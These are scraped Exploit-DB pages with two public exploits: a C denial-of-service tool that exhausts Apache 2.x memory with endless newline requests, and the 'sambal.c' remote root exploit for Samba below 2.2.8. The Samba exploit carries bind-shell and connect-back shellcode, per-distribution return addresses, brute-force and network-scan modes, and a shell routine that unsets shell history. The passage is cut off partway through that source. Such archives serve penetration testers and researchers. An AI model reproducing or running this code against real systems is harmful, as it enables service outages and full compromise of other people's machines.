Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDApache 2.x - Memory LeakEDB-ID:9CVE:2003-0132EDB Verified:Author:Matthew MurphyType:dosExploit:/Platform:WindowsDate:2003-04-09Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/* apache-massacre.c* Test code for Apache 2.x Memory Leak* By Matthew Murphy** DISCLAIMER: This exploit tool is provided only to test networks for a* known vulnerability. Do not use this tool on systems you do not control,* and do not use this tool on networks you do not own without appropriate* consent from the network owner. You are responsible for any damage your* use of the tool causes. In no event may the author of this tool be held* responsible for damages relating to its use.** As with most Apache exposures, the impacts vary between ports of the server:** Non-Unix (Win32, Netware, OS/2): These ports are most adversely affected* by this, as Apache's child process doesn't terminate normally unless the* parent process stops. This means that leaks (and any performance loss) hang* around until Apache is restarted.** Unix/mpm_prefork: This MPM offers the most protection against successful* exploitation, as its processes exit at the end of the request.** Unix/other MPMs: These other MPMs utilize multiple Apache processes for* multiple Apache requests. Depending on the MPM in use and the traffic rates* of the server, this may be used to the advantage of a potential attacker.* If multiple different Apache processes are utilized, an attacker can spread* the substantial leak between processes to dodge resource limits imposed on* httpd's UID (usually nobody, www, or apache)** Credit: iDEFENSE reported this issue to several security lists on April 8,* 2003 following the Apache release announcement. Apache fixed the flaw about* a month after the initial disclosure of this vulnerability. iDEFENSE credits* the discovery of this vulnerability to an anonymous researcher.** Happy Hunting!*/#ifndef _WIN32#include <netdb.h>#include <sys/types.h>#include <sys/socket.h>#include <sys/wait.h>#include <sys/stat.h>#include <sys/time.h>#include <netinet/in.h>#include <fcntl.h>#else#include <windows.h>#pragma comment(lib, "wsock32.lib")#endif#include <stdlib.h>#include <stdio.h>int sig_fired = 0;#ifndef _WIN32void sig_handler(int sig) {#elseBOOL WINAPI sig_handler(DWORD dwCtrlType) {#endifsig_fired = 1;#ifndef _WIN32return;#elsereturn TRUE;#endif}int main(int argc, char *argv[]) {SOCKET s;struct sockaddr_in sin;char buffer[1025];struct hostent *he;unsigned short iPort = 80;int newlines = 100;char *p;char *p2;int i;#ifdef _WIN32WSADATA wsa_prov;#endifprintf("Apache Massacre v1.0\r\n");printf("Exploit by Matthew Murphy\r\n");printf("Vulnerability reported by iDEFENSE Labs\r\n\r\n");#ifdef _WIN32if (WSAStartup(0x0101, &wsa_prov)) {perror("WSAStartup");exit(1);}#endifprintf("Please enter the web server's host/IP: ");fgets(&buffer[0], 1024, stdin);he = gethostbyname(&buffer[0]);if (!he) {perror("gethostbyname");exit(1);}sin.sin_addr.s_addr = *((unsigned long *)he->h_addr);printf("Please enter the web server's port: ");fgets(&buffer[0], 1024, stdin);iPort = (unsigned short)atoi(&buffer[0]);#ifndef _WIN32#ifdef _SOLARISsigset(SIGINT, &sig_handler);#elsesignal(SIGINT, &sig_handler);#endif#elseSetConsoleCtrlHandler(&sig_handler, TRUE);#endifprintf("How many newlines should be in each request [100]: ");fgets(&buffer[0], 1024, stdin);if (!buffer[0] == 0x0D && !buffer[0] == 0x0A) {newlines = atoi(&buffer[0]);}p = malloc(newlines*2);p2 = p;for (i = 0; i < newlines; i++) {*p2 = 0x0D;p2++;*p2 = 0x0A;p2++;}newlines += newlines;s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);if (s < 0) {perror("socket");exit(1);}sin.sin_family = AF_INET;sin.sin_port = htons(iPort);if (connect(s, (const struct sockaddr *)&sin, sizeof(struct sockaddr_in))) {perror("connect");exit(1);}while (1) {if (!send(s, (char *)p, newlines, 0) == newlines) {perror("send");exit(1);}if (sig_fired) {printf("Terminating on SIGINT");free(p);#ifndef _WIN32close(s);#elseclosesocket(s);WSACleanup();#endifexit(0);}}}// milw0rm.com [2003-04-09]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 10
Samba < 2.2.8 (Linux/BSD) - Remote Code Execution - Multiple remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDSamba < 2.2.8 (Linux/BSD) - Remote Code ExecutionEDB-ID:10CVE:2003-0201EDB Verified:Author:eSDeeType:remoteExploit:/Platform:MultipleDate:2003-04-10Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/*Remote root exploit for Samba 2.2.x and prior that works againstLinux (all distributions), FreeBSD (4.x, 5.x), NetBSD (1.x) andOpenBSD (2.x, 3.x and 3.2 non-executable stack).sambal.c is able to identify samba boxes. It will send a netbiosname packet to port 137. If the box responds with the mac address00-00-00-00-00-00, it's probally running samba.[esdee@embrace esdee]$ ./sambal -d 0 -C 60 -S 192.168.0samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)--------------------------------------------------------------+ Scan mode.+ [192.168.0.3] Samba+ [192.168.0.10] Windows+ [192.168.0.20] Windows+ [192.168.0.21] Samba+ [192.168.0.30] Windows+ [192.168.0.31] Samba+ [192.168.0.33] Windows+ [192.168.0.35] Windows+ [192.168.0.36] Windows+ [192.168.0.37] Windows...+ [192.168.0.133] SambaGreat!You could now try a preset (-t0 for a list), but most of thetime bruteforce will do. The smbd spawns a new process on everyconnect, so we can bruteforce the return address...[esdee@embrace esdee]$ ./sambal -b 0 -v 192.168.0.133samba-2.2.8 < remote root exploit by eSDee (www.netric.org|be)--------------------------------------------------------------+ Verbose mode.+ Bruteforce mode. (Linux)+ Using ret: [0xbffffed4]+ Using ret: [0xbffffda8]+ Using ret: [0xbffffc7c]+ Using ret: [0xbffffb50]+ Using ret: [0xbffffa24]+ Using ret: [0xbffff8f8]+ Using ret: [0xbffff7cc]+ Worked!--------------------------------------------------------------Linux LittleLinux.selwerd.lan 2.4.18-14 #1 Wed Sep 4 11:57:57 EDT 2002 i586i586 i386 GNU/Linuxuid=0(root) gid=0(root) groups=99(nobody)sambal.c : samba-2.2.8 < remote root exploit by eSDee (www.netric.org|*/#include <stdio.h>#include <string.h>#include <stdlib.h>#include <netdb.h>#include <errno.h>#include <fcntl.h>#include <signal.h>#include <string.h>#include <unistd.h>#include <sys/select.h>#include <sys/socket.h>#include <sys/types.h>#include <sys/time.h>#include <sys/wait.h>#include <netinet/in.h>#include <arpa/inet.h>typedef struct {unsigned char type;unsigned char flags;unsigned short length;} NETBIOS_HEADER;typedef struct {unsigned char protocol[4];unsigned char command;unsigned short status;unsigned char reserved;unsigned char  flags;unsigned short flags2;unsigned char  pad[12];unsigned short tid;unsigned short pid;unsigned short uid;unsigned short mid;} SMB_HEADER;int OWNED = 0;pid_t childs[100];struct sockaddr_in addr1;struct sockaddr_in addr2;char linux_bindcode[] ="\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\xb1\x01\x51\xb1\x02\x51""\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc1\x31\xc0\x31\xdb\x50\x50""\x50\x66\x68\xb0\xef\xb3\x02\x66\x53\x89\xe2\xb3\x10\x53\xb3\x02""\x52\x51\x89\xca\x89\xe1\xb0\x66\xcd\x80\x31\xdb\x39\xc3\x74\x05""\x31\xc0\x40\xcd\x80\x31\xc0\x50\x52\x89\xe1\xb3\x04\xb0\x66\xcd""\x80\x89\xd7\x31\xc0\x31\xdb\x31\xc9\xb3\x11\xb1\x01\xb0\x30\xcd""\x80\x31\xc0\x31\xdb\x50\x50\x57\x89\xe1\xb3\x05\xb0\x66\xcd\x80""\x89\xc6\x31\xc0\x31\xdb\xb0\x02\xcd\x80\x39\xc3\x75\x40\x31\xc0""\x89\xfb\xb0\x06\xcd\x80\x31\xc0\x31\xc9\x89\xf3\xb0\x3f\xcd\x80""\x31\xc0\x41\xb0\x3f\xcd\x80\x31\xc0\x41\xb0\x3f\xcd\x80\x31\xc0""\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8b\x54\x24""\x08\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x31\xc0""\x89\xf3\xb0\x06\xcd\x80\xeb\x99";char bsd_bindcode[] ="\x31\xc0\x31\xdb\x53\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x54\xb0""\x61\xcd\x80\x89\xc7\x31\xc0\x50\x50\x50\x66\x68\xb0\xef\xb7\x02""\x66\x53\x89\xe1\x31\xdb\xb3\x10\x53\x51\x57\x50\xb0\x68\xcd\x80""\x31\xdb\x39\xc3\x74\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\x50\x57""\x50\xb0\x6a\xcd\x80\x31\xc0\x31\xdb\x50\x89\xe1\xb3\x01\x53\x89""\xe2\x50\x51\x52\xb3\x14\x53\x50\xb0\x2e\xcd\x80\x31\xc0\x50\x50""\x57\x50\xb0\x1e\xcd\x80\x89\xc6\x31\xc0\x31\xdb\xb0\x02\xcd\x80""\x39\xc3\x75\x44\x31\xc0\x57\x50\xb0\x06\xcd\x80\x31\xc0\x50\x56""\x50\xb0\x5a\xcd\x80\x31\xc0\x31\xdb\x43\x53\x56\x50\xb0\x5a\xcd""\x80\x31\xc0\x43\x53\x56\x50\xb0\x5a\xcd\x80\x31\xc0\x50\x68\x2f""\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54\x53\x50\xb0\x3b""\xcd\x80\x31\xc0\xb0\x01\xcd\x80\x31\xc0\x56\x50\xb0\x06\xcd\x80""\xeb\x9a";char linux_connect_back[] ="\x31\xc0\x31\xdb\x31\xc9\x51\xb1\x06\x51\xb1\x01\x51\xb1\x02\x51""\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc2\x31\xc0\x31\xc9\x51\x51""\x68\x41\x42\x43\x44\x66\x68\xb0\xef\xb1\x02\x66\x51\x89\xe7\xb3""\x10\x53\x57\x52\x89\xe1\xb3\x03\xb0\x66\xcd\x80\x31\xc9\x39\xc1""\x74\x06\x31\xc0\xb0\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3\xcd\x80""\x31\xc0\xb0\x3f\x89\xd3\xb1\x01\xcd\x80\x31\xc0\xb0\x3f\x89\xd3""\xb1\x02\xcd\x80\x31\xc0\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f""\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x31\xc0\xb0""\x01\xcd\x80";char bsd_connect_back[] ="\x31\xc0\x31\xdb\x53\xb3\x06\x53\xb3\x01\x53\xb3\x02\x53\x54\xb0""\x61\xcd\x80\x31\xd2\x52\x52\x68\x41\x41\x41\x41\x66\x68\xb0\xef""\xb7\x02\x66\x53\x89\xe1\xb2\x10\x52\x51\x50\x52\x89\xc2\x31\xc0""\xb0\x62\xcd\x80\x31\xdb\x39\xc3\x74\x06\x31\xc0\xb0\x01\xcd\x80""\x31\xc0\x50\x52\x50\xb0\x5a\xcd\x80\x31\xc0\x31\xdb\x43\x53\x52""\x50\xb0\x5a\xcd\x80\x31\xc0\x43\x53\x52\x50\xb0\x5a\xcd\x80\x31""\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x54""\x53\x50\xb0\x3b\xcd\x80\x31\xc0\xb0\x01\xcd\x80";struct {char *type;unsigned long ret;char *shellcode;int os_type;    /* 0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD non-exec stack */} targets[] = {{ "samba-2.2.x - Debian 3.0           ", 0xbffffea2, linux_bindcode, 0 },{ "samba-2.2.x - Gentoo 1.4.x         ", 0xbfffe890, linux_bindcode, 0 },{ "samba-2.2.x - Mandrake 8.x         ", 0xbffff6a0, linux_bindcode, 0 },{ "samba-2.2.x - Mandrake 9.0         ", 0xbfffe638, linux_bindcode, 0 },{ "samba-2.2.x - Redhat 9.0           ", 0xbffff7cc, linux_bindcode, 0 },{ "samba-2.2.x - Redhat 8.0           ", 0xbffff2f0, linux_bindcode, 0 },{ "samba-2.2.x - Redhat 7.x           ", 0xbffff310, linux_bindcode, 0 },{ "samba-2.2.x - Redhat 6.x           ", 0xbffff2f0, linux_bindcode, 0 },{ "samba-2.2.x - Slackware 9.0        ", 0xbffff574, linux_bindcode, 0 },{ "samba-2.2.x - Slackware 8.x        ", 0xbffff574, linux_bindcode, 0 },{ "samba-2.2.x - SuSE 7.x             ", 0xbffffbe6, linux_bindcode, 0 },{ "samba-2.2.x - SuSE 8.x             ", 0xbffff8f8, linux_bindcode, 0 },{ "samba-2.2.x - FreeBSD 5.0          ", 0xbfbff374, bsd_bindcode, 1 },{ "samba-2.2.x - FreeBSD 4.x          ", 0xbfbff374, bsd_bindcode, 1 },{ "samba-2.2.x - NetBSD 1.6           ", 0xbfbfd5d0, bsd_bindcode, 1 },{ "samba-2.2.x - NetBSD 1.5           ", 0xbfbfd520, bsd_bindcode, 1 },{ "samba-2.2.x - OpenBSD 3.2          ", 0x00159198, bsd_bindcode, 2 },{ "samba-2.2.8 - OpenBSD 3.2 (package)", 0x001dd258, bsd_bindcode, 2 },{ "samba-2.2.7 - OpenBSD 3.2 (package)", 0x001d9230, bsd_bindcode, 2 },{ "samba-2.2.5 - OpenBSD 3.2 (package)", 0x001d6170, bsd_bindcode, 2 },{ "Crash (All platforms)              ", 0xbade5dee, linux_bindcode, 0 },};void shell();void usage();void handler();int is_samba(char *ip, unsigned long time_out);int Connect(int fd, char *ip, unsigned int port, unsigned int time_out);int read_timer(int fd, unsigned int time_out);int write_timer(int fd, unsigned int time_out);int start_session(int sock);int exploit_normal(int sock, unsigned long ret, char *shellcode);int exploit_openbsd32(int sock, unsigned long ret, char *shellcode);void usage(char *prog){fprintf(stderr, "Usage: %s [-bBcCdfprsStv] [host]\n\n""-b <platform>   bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)\n""-B <step>       bruteforce steps (default = 300)\n""-c <ip address> connectback ip address\n""-C <max childs> max childs for scan/bruteforce mode (default = 40)\n""-d <delay>      bruteforce/scanmode delay in micro seconds (default = 100000)\n""-f              force\n""-p <port>       port to attack (default = 139)\n""-r <ret>        return address\n""-s              scan mode (random)\n""-S <network>    scan mode\n""-t <type>       presets (0 for a list)\n""-v              verbose mode\n\n", prog);exit(1);}int is_samba(char *ip, unsigned long time_out){charnbtname[]= /* netbios name packet */{0x80,0xf0,0x00,0x10,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x20,0x43,0x4b,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x41,0x00,0x00,0x21,0x00,0x01};unsigned char recv_buf[1024];unsigned char *ptr;int i = 0;int s = 0;unsigned int total = 0;if ((s = socket(PF_INET, SOCK_DGRAM, 17)) <= 0) return -1;if(Connect(s, ip, 137, time_out) == -1) {close(s);return -1;}memset(recv_buf, 0x00, sizeof(recv_buf));if(write_timer(s, time_out) == 1) {if (write(s, nbtname, sizeof(nbtname)) <= 0) {close(s);return -1;}}if (read_timer(s, time_out) == 1) {if (read(s, recv_buf, sizeof(recv_buf)) <= 0) {close(s);return -1;}ptr = recv_buf + 57;total = *(ptr - 1); /* max names */while(ptr < recv_buf + sizeof(recv_buf)) {ptr += 18;if (i == total) {ptr -= 19;if ( *(ptr + 1) == 0x00 && *(ptr + 2) == 0x00 && *(ptr + 3) == 0x00 &&*(ptr + 4) == 0x00 && *(ptr + 5) == 0x00 && *(ptr + 6) == 0x00) {close(s);return 0;}close(s);return 1;}i++;}}close(s);return -1;}int Connect(int fd, char *ip, unsigned int port, unsigned int time_out){/* ripped from no1 */int                      flags;int                      select_status;fd_set                   connect_read, connect_write;struct timeval           timeout;int                      getsockopt_length = 0;int                      getsockopt_error = 0;struct sockaddr_in       server;bzero(&server, sizeof(server));server.sin_family = AF_INET;inet_pton(AF_INET, ip, &server.sin_addr);server.sin_port = htons(port);if((flags = fcntl(fd, F_GETFL, 0)) < 0) {close(fd);return -1;}if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0) {close(fd);return -1;}timeout.tv_sec = time_out;timeout.tv_usec = 0;FD_ZERO(&connect_read);FD_ZERO(&connect_write);FD_SET(fd, &connect_read);FD_SET(fd, &connect_write);if((connect(fd, (struct sockaddr *) &server, sizeof(server))) < 0) {if(errno != EINPROGRESS) {close(fd);return -1;}}else {if(fcntl(fd, F_SETFL, flags) < 0) {close(fd);return -1;}return 1;}select_status = select(fd + 1, &connect_read, &connect_write, NULL, &timeout);if(select_status == 0) {close(fd);return -1;}if(select_status == -1) {close(fd);return -1;}if(FD_ISSET(fd, &connect_read) || FD_ISSET(fd, &connect_write)) {if(FD_ISSET(fd, &connect_read) && FD_ISSET(fd, &connect_write)){getsockopt_length = sizeof(getsockopt_error);if(getsockopt(fd, SOL_SOCKET, SO_ERROR, &getsockopt_error, &getsockopt_length) < 0) {errno = ETIMEDOUT;close(fd);return -1;}if(getsockopt_error == 0) {if(fcntl(fd, F_SETFL, flags) < 0) {close(fd);return -1;}return 1;}else {errno = getsockopt_error;close(fd);return (-1);}}}else {close(fd);return 1;}if(fcntl(fd, F_SETFL, flags) < 0) {close(fd);return -1;}return 1;}int read_timer(int fd, unsigned int time_out){/* ripped from no1 */int                      flags;int                      select_status;fd_set                   fdread;struct timeval           timeout;if((flags = fcntl(fd, F_GETFL, 0)) < 0) {close(fd);return (-1);}if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0) {close(fd);return (-1);}timeout.tv_sec = time_out;timeout.tv_usec = 0;FD_ZERO(&fdread);FD_SET(fd, &fdread);select_status = select(fd + 1, &fdread, NULL, NULL, &timeout);if(select_status == 0) {close(fd);return (-1);}if(select_status == -1) {close(fd);return (-1);}if(FD_ISSET(fd, &fdread)) {if(fcntl(fd, F_SETFL, flags) < 0) {close(fd);return -1;}return 1;}else {close(fd);return 1;}}int write_timer(int fd, unsigned int time_out){/* ripped from no1 */int                      flags;int                      select_status;fd_set                   fdwrite;struct timeval           timeout;if((flags = fcntl(fd, F_GETFL, 0)) < 0) {close(fd);return (-1);}if(fcntl(fd, F_SETFL, flags | O_NONBLOCK) < 0) {close(fd);return (-1);}timeout.tv_sec = time_out;timeout.tv_usec = 0;FD_ZERO(&fdwrite);FD_SET(fd, &fdwrite);select_status = select(fd + 1, NULL, &fdwrite, NULL, &timeout);if(select_status == 0) {close(fd);return -1;}if(select_status == -1) {close(fd);return -1;}if(FD_ISSET(fd, &fdwrite)) {if(fcntl(fd, F_SETFL, flags) < 0) {close(fd);return -1;}return 1;}else {close(fd);return -1;}}void shell(int sock){fd_set  fd_read;char buff[1024], *cmd="unset HISTFILE; echo \"*** JE MOET JE MUIL HOUWE\";uname -a;id;\n";int n;FD_ZERO(&fd_read);FD_SET(sock, &fd_read);FD_SET(0, &fd_read);send(sock, cmd, strlen(cmd), 0);while(1) {FD_SET(sock,&fd_read);FD_SET(0,&fd_read);if (select(FD_SETSIZE, &fd_read, NULL, NULL, NULL) < 0 ) break;if (FD_ISSET(sock, &fd_read)) {if((n = recv(sock, buff, sizeof(buff), 0)) < 0){fprintf(stderr, "EOF\n");exit(2);}if (write(1, buff, n) < 0) break;}if (FD_ISSET(0, &fd_read)) {if((n = read(0, buff, sizeof(buff))) < 0){fprintf(stderr, "EOF\n");exit(2);}if (send(sock, buff, n, 0) < 0) break;}usleep(10);}fprintf(stderr, "Connection lost.\n\n");exit(0);}void handler(){int sock = 0;int i = 0;OWNED = 1;for (i = 0; i < 100; i++)if (childs[i] != 0xffffffff) waitpid(childs[i], NULL, 0);if ((sock = socket(AF_INET, SOCK_STREAM, 6)) < 0) {close(sock);exit(1);}if(Connect(sock, (char *)inet_ntoa(addr1.sin_addr), 45295, 2) != -1) {fprintf(stdout, "+ Worked!\n""--------------------------------------------------------------\n");shell(sock);close(sock);}}int start_session(int sock){char buffer[1000];char response[4096];char session_data1[]    = "\x00\xff\x00\x00\x00\x00\x20\x02\x00\x01\x00\x00\x00\x00";char session_data2[]    = "\x00\x00\x00\x00\x5c\x5c\x69\x70\x63\x24\x25\x6e\x6f\x62\x6f\x64\x79""\x00\x00\x00\x00\x00\x00\x00\x49\x50\x43\x24";NETBIOS_HEADER  *netbiosheader;SMB_HEADER      *smbheader;memset(buffer, 0x00, sizeof(buffer));netbiosheader   = (NETBIOS_HEADER *)buffer;smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));netbiosheader->type     = 0x00;         /* session message */netbiosheader->flags    = 0x00;netbiosheader->length   = htons(0x2E);smbheader->protocol[0]  = 0xFF;smbheader->protocol[1]  = 'S';smbheader->protocol[2]  = 'M';smbheader->protocol[3]  = 'B';smbheader->command      = 0x73;         /* session setup */smbheader->flags        = 0x08;         /* caseless pathnames */smbheader->flags2       = 0x01;         /* long filenames supported */smbheader->pid          = getpid() & 0xFFFF;smbheader->uid          = 100;smbheader->mid          = 0x01;memcpy(buffer + sizeof(NETBIOS_HEADER) + sizeof(SMB_HEADER), session_data1, sizeof(session_data1) - 1);if(write_timer(sock, 3) == 1)if (send(sock, buffer, 50, 0) < 0) return -1;memset(response, 0x00, sizeof(response));if (read_timer(sock, 3) == 1)if (read(sock, response, sizeof(response) - 1) < 0) return -1;netbiosheader = (NETBIOS_HEADER *)response;smbheader     = (SMB_HEADER *)(response + sizeof(NETBIOS_HEADER));if (netbiosheader->type != 0x00) fprintf(stderr, "+ Recieved a non session message\n");netbiosheader   = (NETBIOS_HEADER *)buffer;smbheader       = (SMB_HEADER *)(buffer + sizeof(NETBIOS_HEADER));memset(buffer, 0x00, sizeof(buffer));netbiosheader->type     = 0x00;         /* session message 